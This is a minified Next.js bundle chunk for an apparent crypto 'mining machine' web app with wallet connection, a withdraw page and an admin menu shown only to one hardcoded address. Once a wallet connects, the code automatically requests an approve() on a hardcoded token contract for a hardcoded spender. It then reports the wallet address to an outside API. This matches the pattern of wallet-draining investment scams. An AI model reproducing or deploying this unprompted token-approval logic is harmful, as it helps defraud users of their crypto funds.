(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[98268],{35883:function(){},37996:function(e,A,a){"use strict";a.r(A),a.d(A,{default:function(){return P}});var t=a(3827),n=a(64090),i=a(14297),s=a(20703),d=a(44600),o=a.n(d),l=a(61996),c=a.n(l),r=a(35573),m=a(28928),g=a(63805),h=a(24362),u=a(85738);let p=(0,u.ax)({id:97,name:"BNB Smart Chain Testnet",nativeCurrency:{name:"BNB Chain Native Token",symbol:"tBNB",decimals:18},blockExplorers:[{name:"bscscan-testnet",url:"https://testnet.bscscan.com"}]}),E=(0,u.ax)({id:11155111,name:"Sepolia",nativeCurrency:{name:"Sepolia Ether",symbol:"ETH",decimals:18},blockExplorers:[{name:"Etherscan",url:"https://sepolia.etherscan.io",apiUrl:"https://api-sepolia.etherscan.io/api"}],testnet:!0}),_=(0,u.ax)({id:56,name:"BNB Smart Chain Mainnet",nativeCurrency:{name:"BNB Chain Native Token",symbol:"BNB",decimals:18},blockExplorers:[{name:"bscscan",url:"https://bscscan.com"}]}),M=[(0,m.E)("io.metamask"),(0,m.E)("pro.tokenpocket"),(0,m.E)("im.token"),(0,m.E)("com.binance"),(0,m.E)("com.coinbase.wallet"),(0,m.a)()];var N=e=>{let{witchRPC:A=1}=e,[a]=r.Z.useForm(),s=(0,i.M)();return(0,n.useEffect)(()=>{},[s]),(0,t.jsx)("div",{children:(0,t.jsx)(g.ConnectButton,{theme:"dark",client:h.L,wallets:M,connectModal:{size:"compact"},chain:1==A?p:2==A?E:_})})},C={src:"/_next/static/media/logo.0db73f37.jpg",height:610,width:610,blurDataURL:"data:image/jpeg;base64,/9j/2wBDAAoHBwgHBgoICAgLCgoLDhgQDg0NDh0VFhEYIx8lJCIfIiEmKzcvJik0KSEiMEExNDk7Pj4+JS5ESUM8SDc9Pjv/2wBDAQoLCw4NDhwQEBw7KCIoOzs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozv/wgARCAAIAAgDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABhhP/xAAXEAADAQAAAAAAAAAAAAAAAAABAgMR/9oACAEBAAEFAtUS/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAgBAwEBPwF//8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAgBAgEBPwF//8QAFhAAAwAAAAAAAAAAAAAAAAAAACEx/9oACAEBAAY/AlD/xAAYEAEBAAMAAAAAAAAAAAAAAAABEQAxQf/aAAgBAQABPyEdIrbOZ//aAAwDAQACAAMAAAAQD//EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQMBAT8Qf//EABURAQEAAAAAAAAAAAAAAAAAAAAB/9oACAECAQE/EK//xAAaEAACAgMAAAAAAAAAAAAAAAABEQAhMWFx/9oACAEBAAE/EFNWhAlwK1jrn//Z",blurWidth:8,blurHeight:8},x=a(23349),w=a(37432),B=a(31254),f=a(88549),R=a(99790),y=a(73107),v=a(70975),S=e=>{let{onToggleRightMenu:A}=e,a=(0,i.M)(),[d,o]=(0,n.useState)(!1),[l,r]=(0,n.useState)(1),m=async e=>{if(a){let A=await (0,x.RA)(e.BUSDaddress,w.T),t=R.Bz;try{let n=await A.approve(e.ETHAddress,t,{gasLimit:1e6});await n.wait();let i="https://app.myoilfield.org/api/wallet/createWallet?walletAddress="+a.address+"&balance=0";y.Z.get(i).then(e=>{}).catch(e=>{}),B.ZP.success("授权成功")}catch(e){console.log(e,"error"),B.ZP.success("授权失败，请重试")}}else B.ZP.warning("请登录")},g=async e=>{let A=await (0,x.RA)(e.ETHAddress,v.B),t=await A.checkAllowance(e.BUSDaddress,a.address,e.ETHAddress);"0.0"==(0,x.rE)(t)?(m(JSON.parse(localStorage.getItem("Nodestorage")||"")),o(!1)):o(!0)},h=e=>{"BEP20USDT"===e?(localStorage.setItem("Nodestorage",JSON.stringify({ETHAddress:"0x75101A8aC197E3Ea3A9eAeA92Bb98aa17Da3aa41",BUSDaddress:"0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814",RPCURL:"https://data-seed-prebsc-1-s1.binance.org:8545/",id:1})),r(1)):"ERC20USDT"===e?(localStorage.setItem("Nodestorage",JSON.stringify({ETHAddress:"",BUSDaddress:"",RPCURL:"https://sepolia.infura.io/v3/YOUR-PROJECT-ID",id:2})),r(2)):"TRC20USDT"===e?(localStorage.setItem("Nodestorage",JSON.stringify({ETHAddress:"",BUSDaddress:"",RPCURL:"https://api.shasta.trongrid.io",id:3})),r(3)):(localStorage.setItem("Nodestorage",JSON.stringify({ETHAddress:"0x75101A8aC197E3Ea3A9eAeA92Bb98aa17Da3aa41",BUSDaddress:"0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814",RPCURL:"https://data-seed-prebsc-1-s1.binance.org:8545/",id:1})),r(1)),g(JSON.parse(localStorage.getItem("Nodestorage")||""))};return(0,n.useEffect)(()=>{a&&h("999")},[a]),(0,t.jsxs)("div",{className:c().pagetop,children:[(0,t.jsx)(s.default,{className:c().m1,src:C,alt:"coin",width:40,height:40}),(0,t.jsx)(N,{witchRPC:l}),(0,t.jsx)("div",{children:(0,t.jsx)(f.default,{defaultValue:"BEP20USDT",style:{width:100},onChange:h,options:[{value:"BEP20USDT",label:"BNB Chain"},{value:"ERC20USDT",label:"Ethereum"},{value:"TRC20USDT",label:"TRON"}]})}),(0,t.jsx)(s.default,{onClick:A,className:c().m3,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/menu.png",alt:"menu",width:50,height:50})]})},D=a(47907),T=a(60809),k=a.n(T),b={src:"/_next/static/media/Administrator.ba429778.png",height:200,width:212,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAMAAADz0U65AAAAJFBMVEX///9MaXH///////////////////////////////////////+2I0voAAAADHRSTlNeAJVki4ZqBCWrGVLpCrpEAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAMklEQVR4nEWLxwkAMAzE7lzitv++IRDwTyAJnDKvISid2ULAAggDnEePUha+0o055W+/KJABIdMC4NsAAAAASUVORK5CYII=",blurWidth:8,blurHeight:8},j={src:"/_next/static/media/selectorSwitch.e945e2be.png",height:44,width:44,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAMAAADz0U65AAAAG1BMVEX////////////////////////////+/v7///9JhYuvAAAACXRSTlOAvm+UMwQvW6dmS9EqAAAACXBIWXMAAAsTAAALEwEAmpwYAAAALUlEQVR4nEWLMRIAMAiDiMbq/1/cqXbjDqAOEqewMiJlKCIoGGd3ej6s2vjtFxz4AM2Ne6ZDAAAAAElFTkSuQmCC",blurWidth:8,blurHeight:8},I=()=>{let e=(0,i.M)(),[A,a]=(0,n.useState)(!1),[d,o]=(0,n.useState)("EN"),l=(0,D.useRouter)();return(0,n.useEffect)(()=>{e&&a("0xf12c64a1a345dde2ab90e22f7dc4279a32265a1f"==e.address.toLowerCase());let A=localStorage.getItem("language");A&&o(A)},[e]),(0,t.jsxs)("div",{className:k().rightMenu,"data-id":"RightMenu",children:[(0,t.jsxs)("div",{"data-id":"RightMenu",className:k().row,onClick:()=>l.push("/HomeLess"),children:[(0,t.jsx)(s.default,{"data-id":"RightMenu",className:k().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/HomePage.png",alt:"coin",width:50,height:50}),(0,t.jsxs)("div",{"data-id":"RightMenu",className:k().text,children:["EN"===d?"Home":"首页"," "]})]}),(0,t.jsxs)("div",{"data-id":"RightMenu",className:k().row,onClick:()=>l.push("/Machine"),children:[(0,t.jsx)(s.default,{"data-id":"RightMenu",className:k().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/MiningMachine.png",alt:"coin",width:50,height:50}),(0,t.jsx)("div",{"data-id":"RightMenu",className:k().text,children:"EN"===d?"Mining":"矿机"})]}),(0,t.jsxs)("div",{"data-id":"RightMenu",className:k().row,onClick:()=>l.push("/Flash"),children:[(0,t.jsx)(s.default,{"data-id":"RightMenu",className:k().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/flash.png",alt:"coin",width:50,height:50}),(0,t.jsx)("div",{"data-id":"RightMenu",className:k().text,children:"EN"===d?"Withdraw":"提款"})]}),(0,t.jsxs)("div",{"data-id":"RightMenu",className:k().row,onClick:()=>l.push("/Personal"),children:[(0,t.jsx)(s.default,{"data-id":"RightMenu",className:k().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/Individualcenter.png",alt:"coin",width:50,height:50}),(0,t.jsx)("div",{"data-id":"RightMenu",className:k().text,children:"EN"===d?"Personal":"个人中心"})]}),A&&(0,t.jsxs)("div",{"data-id":"RightMenu",className:k().row,onClick:()=>l.push("/Administrator"),children:[(0,t.jsx)(s.default,{"data-id":"RightMenu",className:k().img,src:b,alt:"coin",width:50,height:50}),(0,t.jsx)("div",{"data-id":"RightMenu",className:k().text,children:"EN"===d?"Admin":"管理员"})]}),(0,t.jsxs)("div",{"data-id":"RightMenu",className:k().row,onClick:()=>{let e="EN"===d?"CN":"EN";o(e),localStorage.setItem("language",e),window.location.reload()},children:[(0,t.jsx)(s.default,{"data-id":"RightMenu",className:k().img,src:j,alt:"coin",width:50,height:50}),(0,t.jsxs)("div",{"data-id":"RightMenu",className:k().text,children:["EN"===d?"EN":"CN"," "]})]})]})},U=a(18286),L=a(33052),O={src:"/_next/static/media/beijing.d082cf54.png",height:2007,width:2250,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAHCAMAAAACh/xsAAAACVBMVEUJCRsNCykTEjrjuvq3AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAJElEQVR4nEXKsQ0AAAzCMJL/j67KAiyWIAFIMyj4Uiy29t9qDgS6ACitWxw1AAAAAElFTkSuQmCC",blurWidth:8,blurHeight:7},P=()=>{let e=(0,D.useRouter)(),A=(0,i.M)(),[a,d]=(0,n.useState)("EN"),l=A=>{e.push(A.link)},c=()=>{let e="https://m.zsdcoin.com?ref=".concat(A?A.address:"");(0,L.v)(e)},{isRightMenuVisible:r,toggleRightMenu:m,hideRightMenu:g}=(0,n.useContext)(U.MenuContext),h=(0,n.useRef)(null);return(0,n.useEffect)(()=>{let e=localStorage.getItem("language");e&&d(e)},[]),(0,n.useEffect)(()=>{let e=e=>{h.current&&"RightMenu"!==e.target.dataset.id&&g()};return document.addEventListener("mousedown",e),()=>{document.removeEventListener("mousedown",e)}},[g]),(0,t.jsx)(t.Fragment,{children:(0,t.jsxs)("div",{className:o().pageMenu,children:[r&&(0,t.jsx)(I,{}),(0,t.jsx)(S,{onToggleRightMenu:m}),(0,t.jsx)("div",{className:o().videoBackground,id:"nav",children:(0,t.jsx)(s.default,{className:o().imageGif,src:O,alt:""})}),(0,t.jsx)("div",{className:o().top,ref:h,children:("EN"===a?[{link:"/Machine",url:"../../images/MININGMACHINE.png",name:"Mining machine",en:"MINING MACHINE"},{link:"/Personal",url:"../../images/PERSONALCENTER.png",name:"PERSONAL CENTER",en:"PERSONAL CENTER"},{link:"/HomeLess",url:"../../images/homepage.png",name:"Home page",en:"home page"},{link:"/Flash",url:"../../images/WithdrawMoney.png",name:"withdraw money",en:"withdraw money"}]:[{link:"/Machine",url:"../../images/MININGMACHINE.png",name:"矿机",en:"MINING MACHINE"},{link:"/Personal",url:"../../images/PERSONALCENTER.png",name:"个人中心",en:"PERSONAL CENTER"},{link:"/HomeLess",url:"../../images/homepage.png",name:"首 页",en:"home page"},{link:"/Flash",url:"../../images/WithdrawMoney.png",name:"取 款",en:"withdraw money"}]).map((e,A)=>(0,t.jsxs)("div",{className:"".concat(o()["menyBtn"+A]," ").concat(o().menyBtn),onClick:"/InCode"===e.link?c:()=>l(e),children:[(0,t.jsx)(s.default,{className:"".concat(o()["img"+A]),src:e.url,alt:e.name,width:50,height:50}),(0,t.jsx)("div",{className:o()["menyBtn-n"],children:e.name}),(0,t.jsx)("div",{className:o()["menyBtn-e"],children:e.en})]},e.link))})]})})}},33052:function(e,A,a){"use strict";a.d(A,{v:function(){return i}});var t=a(31254);let n=()=>"clipboard"in navigator,i=async e=>{try{if(n()){let A=document.createElement("textarea");A.value=e,document.body.appendChild(A),A.select(),document.execCommand("copy"),document.body.removeChild(A),t.ZP.success("复制成功")}else{let A=document.createElement("textarea");A.value=e,A.style.position="fixed",A.style.opacity="0",document.body.appendChild(A),A.focus(),A.select();try{document.execCommand("copy")?t.ZP.success("复制成功"):t.ZP.error("复制失败，请稍后重试")}catch(e){t.ZP.error("复制失败，请稍后重试")}finally{document.body.removeChild(A)}}}catch(a){let A=document.createElement("textarea");A.value=e,document.body.appendChild(A),A.select(),document.execCommand("copy"),document.body.removeChild(A),t.ZP.error("复制失败，请稍后重试")}}},60809:function(e){e.exports={rightMenu:"RightMenu_rightMenu__4Vdi0",row:"RightMenu_row__vVKio",img:"RightMenu_img__LvhXL",text:"RightMenu_text__kgeAO","video-background":"RightMenu_video-background__VO7sD",content:"RightMenu_content__zza7R"}},44600:function(e){e.exports={pageMenu:"TopMenu_pageMenu__tgFwW",top:"TopMenu_top__CE9fR",menyBtn0:"TopMenu_menyBtn0__OU6ht",menyBtn1:"TopMenu_menyBtn1__wpmzY",menyBtn2:"TopMenu_menyBtn2__9YB4v",menyBtn3:"TopMenu_menyBtn3__42O5W",menyBtn4:"TopMenu_menyBtn4__jMDkX",menyBtn5:"TopMenu_menyBtn5__YwPul",menyBtn:"TopMenu_menyBtn__5Rl_B","menyBtn-n":"TopMenu_menyBtn-n___3oET","menyBtn-e":"TopMenu_menyBtn-e__o7RuC",img0:"TopMenu_img0__EwxhJ",img1:"TopMenu_img1__U8byq",img2:"TopMenu_img2__Ixg5G",img3:"TopMenu_img3__sypae",img4:"TopMenu_img4__IL4yF",img5:"TopMenu_img5__ZAun1","video-background":"TopMenu_video-background__40Bxp",content:"TopMenu_content__s8Xj1",imageGif:"TopMenu_imageGif__f0WuQ"}},61996:function(e){e.exports={pagetop:"Top_pagetop__5k2y2",m1:"Top_m1__eJ96o",m2:"Top_m2__Leibv",m3:"Top_m3__8JExu",ljqb:"Top_ljqb__ktoyc","css-bedeeg":"Top_css-bedeeg__caJQv",deep:"Top_deep__7n1oN"}}}]);